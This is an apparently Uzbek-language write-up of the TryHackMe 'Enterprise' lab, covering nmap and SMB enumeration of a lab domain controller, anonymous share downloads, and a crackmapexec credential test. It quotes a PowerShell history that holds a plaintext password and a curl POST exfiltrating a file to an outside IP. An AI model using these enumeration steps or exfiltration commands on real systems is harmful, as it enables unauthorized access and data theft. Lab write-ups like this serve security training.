# Enterprise
LINK: https://tryhackme.com/room/enterprise


## Razvetka
```
┌──(me262㉿turkestan)-[~]
└─$ nmap -sV -sC 10.49.162.169 -p- -T4 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-23 22:37 +05
Nmap scan report for 10.49.162.169
Host is up (0.23s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-23 17:53:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Not valid before: 2025-12-22T17:37:41
|_Not valid after:  2026-06-23T17:37:41
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-23T17:53:56+00:00
|_ssl-date: 2025-12-23T17:54:05+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: Log in to continue - Log in with Atlassian account
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-23T17:53:58
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 974.42 seconds

```

## Enumeration
```
┌──(me262㉿turkestan)-[~]
└─$ enum4linux-ng 10.49.162.169 -A                                                                          

ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.49.162.169
[*] Username ......... ''
[*] Random Username .. 'ocnrbrmp'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.49.162.169    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.49.162.169    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: ENTERPRISE.THM

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.49.162.169    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.49.162.169    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:                                                                                                
  SMB 1.0: false                                                                                                   
  SMB 2.0.2: true                                                                                                  
  SMB 2.1: true                                                                                                    
  SMB 3.0: true                                                                                                    
  SMB 3.1.1: true                                                                                                  
Preferred dialect: SMB 3.0                                                                                         
SMB1 only: false                                                                                                   
SMB signing required: true                                                                                         

 ============================================================
|    Domain Information via SMB session for 10.49.162.169    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: LAB-DC                                                                                      
NetBIOS domain name: LAB-ENTERPRISE                                                                                
DNS domain: LAB.ENTERPRISE.THM                                                                                     
FQDN: LAB-DC.LAB.ENTERPRISE.THM                                                                                    
Derived membership: domain member                                                                                  
Derived domain: LAB-ENTERPRISE                                                                                     

 ==========================================
|    RPC Session Check on 10.49.162.169    |
 ==========================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[+] Server allows authentication via username 'ocnrbrmp' and password ''
[H] Rerunning enumeration with user 'ocnrbrmp' might give more results

 ====================================================
|    Domain Information via RPC for 10.49.162.169    |
 ====================================================
[+] Domain: LAB-ENTERPRISE
[+] Domain SID: S-1-5-21-2168718921-3906202695-65158103
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.49.162.169    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                           
OS version: '10.0'                                                                                                 
OS release: '1809'                                                                                                 
OS build: '17763'                                                                                                  
Native OS: not supported                                                                                           
Native LAN manager: not supported                                                                                  
Platform id: null                                                                                                  
Server type: null                                                                                                  
Server type string: null                                                                                           

 ======================================
|    Users via RPC on 10.49.162.169    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on 10.49.162.169    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on 10.49.162.169    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ==========================================
|    Policies via RPC for 10.49.162.169    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for 10.49.162.169    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 43.69 seconds
                                                                                                                   
┌──(me262㉿turkestan)-[~]
└─$ 
```
Va yana
```
┌──(me262㉿turkestan)-[~]
└─$ smbclient -L //10.49.162.169 -N


        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Docs            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      Users Share. Do Not Touch!
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.49.162.169 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                   
┌──(me262㉿turkestan)-[~]
└─$ 
```
Shareslarni tekshiramiz.
```
┌──(me262㉿turkestan)-[~/CTF]
└─$ smbclient //10.49.162.169/Docs -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 15 07:47:35 2021
  ..                                  D        0  Mon Mar 15 07:47:35 2021
  RSA-Secured-Credentials.xlsx        A    15360  Mon Mar 15 07:46:54 2021
  RSA-Secured-Document-PII.docx       A    18432  Mon Mar 15 07:45:24 2021

                15587583 blocks of size 4096. 9922139 blocks available
smb: \> get RSA-Secured-Credentials.xlsx
getting file \RSA-Secured-Credentials.xlsx of size 15360 as RSA-Secured-Credentials.xlsx (16.0 KiloBytes/sec) (average 16.0 KiloBytes/sec)
smb: \> get RSA-Secured-Document-PII.docx
getting file \RSA-Secured-Document-PII.docx of size 18432 as RSA-Secured-Document-PII.docx (19.0 KiloBytes/sec) (average 17.5 KiloBytes/sec)
smb: \> 
```
`Docs` shareda qiziq bo'lgan fayllar bor tekshirish kerak.
`Users` sharedagi hamma faylni yuklab olib tekshiramiz.
```
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ smbclient //10.49.162.169/Users -N
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \desktop.ini of size 174 as desktop.ini (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
NT_STATUS_ACCESS_DENIED listing \Administrator\*
NT_STATUS_STOPPED_ON_SYMLINK listing \All Users\*
NT_STATUS_ACCESS_DENIED listing \atlbitbucket\*
NT_STATUS_ACCESS_DENIED listing \bitbucket\*
NT_STATUS_ACCESS_DENIED opening remote file \Default\NTUSER.DAT
NT_STATUS_ACCESS_DENIED opening remote file \Default\NTUSER.DAT.LOG1
NT_STATUS_ACCESS_DENIED opening remote file \Default\NTUSER.DAT.LOG2
NT_STATUS_ACCESS_DENIED opening remote file \Default\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
NT_STATUS_ACCESS_DENIED opening remote file \Default\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
```
Yuklab olingach `tree` dasturi orqali fayllar joylashuvini ko'ramiz.
```
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ ls
 Administrator   atlbitbucket   Default         desktop.ini   Public
'All Users'      bitbucket     'Default User'   LAB-ADMIN
                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ tree
.
├── Administrator
├── All Users
├── atlbitbucket
├── bitbucket
├── Default
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Application Data
│   │   │   ├── History
│   │   │   ├── Microsoft
│   │   │   │   ├── InputPersonalization
│   │   │   │   │   └── TrainedDataStore
│   │   │   │   ├── Windows
│   │   │   │   │   ├── CloudStore
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── Shell
│   │   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   │   ├── Temporary Internet Files
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   ├── WindowsApps
│   │   │   │   └── Windows Sidebar
│   │   │   │       ├── Gadgets
│   │   │   │       └── settings.ini
│   │   │   ├── Temp
│   │   │   └── Temporary Internet Files
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── Control Panel.lnk
│   │           │       ├── desktop.ini
│   │           │       ├── Server Manager.lnk
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           └── Windows
│   │               ├── CloudStore
│   │               ├── Network Shortcuts
│   │               ├── Powershell
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessibility
│   │               │       │   ├── desktop.ini
│   │               │       │   ├── Magnify.lnk
│   │               │       │   ├── Narrator.lnk
│   │               │       │   └── On-Screen Keyboard.lnk
│   │               │       ├── Accessories
│   │               │       │   ├── desktop.ini
│   │               │       │   └── Notepad.lnk
│   │               │       ├── Maintenance
│   │               │       │   └── Desktop.ini
│   │               │       ├── Startup
│   │               │       │   └── RunWallpaperSetupInit.cmd
│   │               │       ├── System Tools
│   │               │       │   ├── Administrative Tools.lnk
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── computer.lnk
│   │               │       │   ├── Control Panel.lnk
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── File Explorer.lnk
│   │               │       │   └── Run.lnk
│   │               │       └── Windows PowerShell
│   │               └── Templates
│   ├── Application Data
│   ├── Cookies
│   ├── Desktop
│   ├── Documents
│   │   ├── My Music
│   │   ├── My Pictures
│   │   └── My Videos
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Local Settings
│   ├── Music
│   ├── My Documents
│   ├── NetHood
│   ├── Pictures
│   ├── PrintHood
│   ├── Recent
│   ├── Saved Games
│   ├── SendTo
│   ├── Start Menu
│   ├── Templates
│   └── Videos
├── Default User
├── desktop.ini
├── LAB-ADMIN
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Microsoft
│   │   │   │   ├── Credentials
│   │   │   │   │   └── DFBE70A7E5CC19A398EBF1B96859CE5D
│   │   │   │   ├── InputPersonalization
│   │   │   │   │   └── TrainedDataStore
│   │   │   │   ├── Windows
│   │   │   │   │   ├── CloudStore
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── Shell
│   │   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TM.blf
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TMContainer00000000000000000001.regtrans-ms
│   │   │   │   │   ├── UsrClass.dat{3aac7186-82b4-11eb-a88a-000c29379b0a}.TMContainer00000000000000000002.regtrans-ms
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   ├── WindowsApps
│   │   │   │   └── Windows Sidebar
│   │   │   │       ├── Gadgets
│   │   │   │       └── settings.ini
│   │   │   └── Temp
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Credentials
│   │           ├── Crypto
│   │           │   └── RSA
│   │           │       └── S-1-5-21-2168718921-3906202695-65158103-1000
│   │           │           └── 83aa4cc77f591dfc2374580bbd95f6ba_baebb989-4cb7-4d0b-89c2-ad186800b0f6
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── Control Panel.lnk
│   │           │       ├── desktop.ini
│   │           │       ├── Server Manager.lnk
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           ├── Protect
│   │           │   ├── CREDHIST
│   │           │   └── S-1-5-21-2168718921-3906202695-65158103-1000
│   │           │       ├── 655a0446-8420-431a-a5d7-2d18eb87b9c3
│   │           │       └── Preferred
│   │           ├── SystemCertificates
│   │           │   └── My
│   │           │       ├── AppContainerUserCertRead
│   │           │       ├── Certificates
│   │           │       ├── CRLs
│   │           │       └── CTLs
│   │           └── Windows
│   │               ├── CloudStore
│   │               ├── Network Shortcuts
│   │               ├── Powershell
│   │               │   └── PSReadline
│   │               │       └── Consolehost_hisory.txt
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessibility
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── Magnify.lnk
│   │               │       │   ├── Narrator.lnk
│   │               │       │   └── On-Screen Keyboard.lnk
│   │               │       ├── Accessories
│   │               │       │   ├── desktop.ini
│   │               │       │   └── Notepad.lnk
│   │               │       ├── Maintenance
│   │               │       │   └── Desktop.ini
│   │               │       ├── System Tools
│   │               │       │   ├── Administrative Tools.lnk
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── computer.lnk
│   │               │       │   ├── Control Panel.lnk
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── File Explorer.lnk
│   │               │       │   └── Run.lnk
│   │               │       └── Windows PowerShell
│   │               │           ├── desktop.ini
│   │               │           ├── Windows PowerShell ISE.lnk
│   │               │           ├── Windows PowerShell ISE (x86).lnk
│   │               │           ├── Windows PowerShell.lnk
│   │               │           └── Windows PowerShell (x86).lnk
│   │               └── Templates
│   ├── Desktop
│   ├── Documents
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Music
│   ├── Pictures
│   ├── Saved Games
│   └── Videos
└── Public

136 directories, 111 files
                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ 
```
Menga Consolehost_hisory.txt ushbu fayl qiziqdek tuyildi. Tekshiramiz.
```
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ find ./ -name "Consolehost_hisory.txt"
./LAB-ADMIN/AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/Consolehost_hisory.txt
                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ cat ./LAB-ADMIN/AppData/Roaming/Microsoft/Windows/Powershell/PSReadline/Consolehost_hisory.txt
cd C:\
mkdir monkey
cd monkey
cd ..
cd ..
cd ..
cd D:
cd D:
cd D:
D:\
mkdir temp
cd temp
echo "replication:101RepAdmin123!!">private.txt
Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
more payment-details.txt
curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://1.215.10.99/dropper.php?file=itsdone.txt
del private.txt
del payment-details.txt
cd ..
del temp
cd C:\
C:\
exit                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ 
```
Shekilli o'zimizga kerakli bo'lgan credintialni topdik.
```
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ crackmapexec smb 10.49.162.169 -u replication -p '101RepAdmin123!!'

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing MSSQL protocol database
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing SMB protocol database
[*] Initializing RDP protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.49.162.169   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
SMB         10.49.162.169   445    LAB-DC           [-] LAB.ENTERPRISE.THM\replication:101RepAdmin123!! STATUS_LOGON_FAILURE 
                                                                                                                   
┌──(me262㉿turkestan)-[~/CTF/enterprise]
└─$ 
```
Qiziq. Boshqa serverlarga ham ko'z tashlashimiz kerak.
